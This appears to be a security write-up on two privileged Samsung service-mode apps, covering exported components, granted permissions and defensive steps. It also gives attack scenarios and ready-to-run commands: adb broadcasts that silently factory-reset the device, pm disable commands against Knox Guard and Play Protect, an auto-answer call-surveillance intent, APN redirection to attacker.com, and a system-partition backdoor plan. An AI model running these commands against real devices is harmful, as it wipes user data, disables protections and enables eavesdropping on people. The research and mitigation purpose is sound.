# Samsung Service Mode Apps - Security Analysis

## Executive Summary

Two privileged Samsung system apps expose extreme attack surface with **ZERO user confirmation required** for many dangerous operations:

1. **com.sec.android.RilServiceModeApp** - RIL/Modem debug tool
2. **com.sec.android.app.servicemodeapp** - Multi-purpose service app

Both apps are signed with Samsung's system certificate, run as privileged system apps, and have **all permissions granted and exported**.

---

## 🔥 CRITICAL FINDINGS

### 1. **Factory Reset Without Confirmation**
```
Broadcast Action: com.samsung.intent.action.SEC_FACTORY_RESET_WITHOUT_FACTORY_UI
Handler: ServiceModeAppBroadcastReceiver
Risk Level: CRITICAL
```
- Device factory resets WITHOUT any user dialog
- Erases all user data silently
- Requires only MASTER_CLEAR permission (which they have)

### 2. **Auto-Answer Calls**
```
Activity: com.sec.android.app.servicemodeapp/.AutoAnswer
Risk Level: CRITICAL
```
- Any incoming call automatically answered
- No notification to user
- Enables surveillance: mic access, call listening

### 3. **Universal APN Modification**
```
Activity: com.sec.android.RilServiceModeApp/.ViewApnInfo
Permission: WRITE_APN_SETTINGS
Risk Level: CRITICAL
```
- Redirect all mobile data to attacker's server
- MITM all data: banking, email, messages
- Bypass app-level encryption (operates at network layer)

### 4. **Secret Code Listener (Dial Pad)**
```
Receiver: SecKeyStringBroadcastReceiver / ServiceModeAppBroadcastReceiver
Action: android_secret_code
Risk Level: HIGH
```
- Dial `*#<CODE>#` to trigger service menus
- No permission check required
- Accessible from dial pad or ADB

### 5. **USB Mode Switching**
```
Activities: USBPathSwitch, USBSettings, SetPortUartUSBCTC...
Risk Level: CRITICAL
```
- Enable/disable ADB debugging mode
- Switch between USB modes (MTP, ADB, Charging)
- Control UART port for modem access

### 6. **Modem Direct Access**
```
Activities: PhoneUtil_ESC, PhoneUtil_MDM9x15, SetPortUartUsbMSM8960
Risk Level: CRITICAL
```
- Access Qualcomm/Broadcom/Marvell modem interfaces
- Read/modify baseband firmware
- Access IMEI, IMSI, network codes

---

## 📊 Attack Surface

### Exported Components (No Permission Required)
- **13 activities** in RilServiceModeApp
- **20 activities** in servicemodeapp
- **2 broadcast receivers** (both apps)
- All callable via `am start` or intent broadcasts

### Permissions Granted (145+ total)

**CRITICAL (Device Control)**
- `MASTER_CLEAR` - Factory reset
- `MODIFY_PHONE_STATE` - Call control
- `WRITE_APN_SETTINGS` - Data redirection
- `CHANGE_COMPONENT_ENABLED_STATE` - Disable security
- `MOUNT_UNMOUNT_FILESYSTEMS` - File system access
- `SHUTDOWN` - Force reboot

**HIGH (Information & Network)**
- `READ_PRIVILEGED_PHONE_STATE` - IMEI, phone number
- `CHANGE_NETWORK_STATE` - Force network modes
- `CHANGE_CONFIGURATION` - Keyboard/input injection
- `WRITE_SECURE_SETTINGS` - System settings

**MEDIUM (App Control & Storage)**
- `INSTALL_PACKAGES` - Install APK files
- `CLEAR_APP_USER_DATA` - Erase app data
- `READ_EXTERNAL_STORAGE` / `WRITE_EXTERNAL_STORAGE`
- `MANAGE_ACCOUNTS` - Account access
- `READ_LOGS` - System log access

---

## 🎯 Attack Scenarios

### Scenario 1: Silent Surveillance
```
1. Start AutoAnswer activity
2. Any incoming call automatically answered
3. Activate modem recording (PhoneUtil_ESC)
4. Listen to all calls without notification
```

### Scenario 2: Data Hijacking
```
1. Access ViewApnInfo activity (RilServiceModeApp)
2. Modify APN to attacker.com
3. All data routes through attacker
4. MITM credentials: banking, 2FA, messages
```

### Scenario 3: Factory Reset Attack
```
adb shell am broadcast -a com.samsung.intent.action.SEC_FACTORY_RESET_WITHOUT_FACTORY_UI \
  com.sec.android.app.servicemodeapp
# Device wipes without confirmation
```

### Scenario 4: Disable Security Components
```
adb shell pm disable com.sec.android.security.knoxguard
adb shell pm disable com.google.android.gms/.PlayProtectionWorker
# All security apps disabled via CHANGE_COMPONENT_ENABLED_STATE
```

### Scenario 5: Persistent Backdoor
```
1. Use MOUNT_UNMOUNT_FILESYSTEMS to mount /system RW
2. Use INSTALL_PACKAGES to install APK to /system/priv-app
3. Backdoor now persistent across factory reset
4. Runs as system UID 1000
```

---

## 🔓 Launch Methods

### Via Dial Codes
```
Dial: *#0829#  (Modem debug log)
Dial: *#0842#  (USB debug mode)
Dial: *#9900#  (Full dump)
# Intercepted by SecKeyStringBroadcastReceiver
```

### Via ADB Intents
```bash
# Start activity
adb shell am start -n com.sec.android.app.servicemodeapp/.AutoAnswer

# Send broadcast
adb shell am broadcast -a com.samsung.intent.action.SEC_FACTORY_RESET_WITHOUT_FACTORY_UI \
  com.sec.android.app.servicemodeapp
```

### Via Another App
```java
Intent intent = new Intent();
intent.setComponent(new ComponentName(
  "com.sec.android.app.servicemodeapp",
  "com.sec.android.app.servicemodeapp.AutoAnswer"
));
startActivity(intent);
```

---

## 🛡️ Defense

### Disable Dangerous Receivers
```bash
adb shell pm disable com.sec.android.RilServiceModeApp/.SecKeyStringBroadcastReceiver
adb shell pm disable com.sec.android.app.servicemodeapp/.ServiceModeAppBroadcastReceiver
```

### Disable Apps Entirely
```bash
adb shell pm disable com.sec.android.RilServiceModeApp
adb shell pm disable com.sec.android.app.servicemodeapp
```

### Monitor Indicators
```bash
# Watch for activity starts
adb logcat | grep -E "(PhoneUtil|AutoAnswer|USBPath|Sec_Ril)"

# Monitor APN changes
adb logcat | grep -i "apn"

# Monitor factory reset
adb logcat | grep -i "reset"
```

### Mitigation via MDM
- Disable components via Device Admin
- Restrict APN modifications
- Prevent USB debugging toggle
- Whitelist allowed broadcast intents
- Monitor component enable/disable

---

## 📈 Risk Assessment

| Component | Risk | Effort | Detection |
|-----------|------|--------|-----------|
| Factory Reset | 🔴 Critical | 🟢 Trivial | 🟡 Medium |
| AutoAnswer | 🔴 Critical | 🟢 Trivial | 🟡 Medium |
| APN Hijack | 🔴 Critical | 🟠 Low | 🟡 Medium |
| Secret Codes | 🔴 Critical | 🟢 Trivial | 🔴 Hard |
| Modem Access | 🔴 Critical | 🟠 Low | 🟡 Medium |
| USB Mode | 🟠 High | 🟢 Trivial | 🟡 Medium |
| System Mod | 🔴 Critical | 🟠 Low | 🟢 Easy |
| Persistent Backdoor | 🔴 Critical | 🟠 Low | 🟡 Medium |

---

## 📋 Files Generated

1. **service-mode-apps-analysis.txt** - Complete technical breakdown
2. **service-mode-launch-commands.txt** - All launch methods & POCs
3. **service-mode-permissions-analysis.txt** - Detailed permission exploitation
4. **SERVICE-MODE-SUMMARY.md** - This file

---

## 🔎 Investigation Artifacts

### dumpsys Output
- File 1: RilServiceModeApp (32.1 KB)
- File 2: servicemodeapp (49.8 KB)

### Key Findings from dumpsys
```
RilServiceModeApp:
  Location: /system/priv-app/ServiceModeApp_RIL
  UID: 1001 (android.uid.phone)
  Activities: 13 exported
  Receivers: 2 exported

servicemodeapp:
  Location: /system/priv-app/serviceModeApp_FB
  UID: 1000 (android.uid.system)
  Activities: 20 exported
  Receivers: 3 exported
```

---

## ⚠️ Disclaimer

This analysis is for authorized security research and red team exercises only. Unauthorized access to computer systems is illegal. Use this information only with explicit permission from device owners.

---

## 📚 References

- Android Permission Model: https://developer.android.com/guide/topics/permissions/overview
- Samsung Knox Security: https://www.samsung.com/us/business/solutions/solutions/knox/
- Privileged System Apps: https://source.android.com/docs/security/features/permissions
- RIL (Radio Interface Layer): Qualcomm/Samsung proprietary modem interface
- FTAT Dump: Full Test Analysis and Troubleshooting (Samsung diagnostic tool)
